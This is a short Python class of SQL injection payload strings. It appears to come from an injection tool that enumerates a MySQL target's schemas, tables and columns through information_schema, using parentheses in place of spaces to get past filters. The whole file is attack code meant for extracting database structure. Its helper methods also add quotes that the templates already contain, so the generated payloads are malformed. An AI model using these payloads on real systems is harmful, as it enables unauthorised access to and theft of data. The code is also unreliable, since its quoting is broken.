class dump:
    db = "database()"
    dbs = "select(group_concat(schema_name))from(information_schema.schemata)"
    tables = "select(group_concat(table_name))from(information_schema.tables)where(table_schema='{0}')"
    columns = "select(group_concat(column_name))from(information_schema.columns)where(table_schema='{0}')and(table_name='{1}')"
    def __init__(self):
        pass

    def tabs(self, db):
        return self.tables.format("'%s'" % db)

    def cols(self, db, tab):
        return self.columns.format("'%s'" % db, "'%s'" % tab)
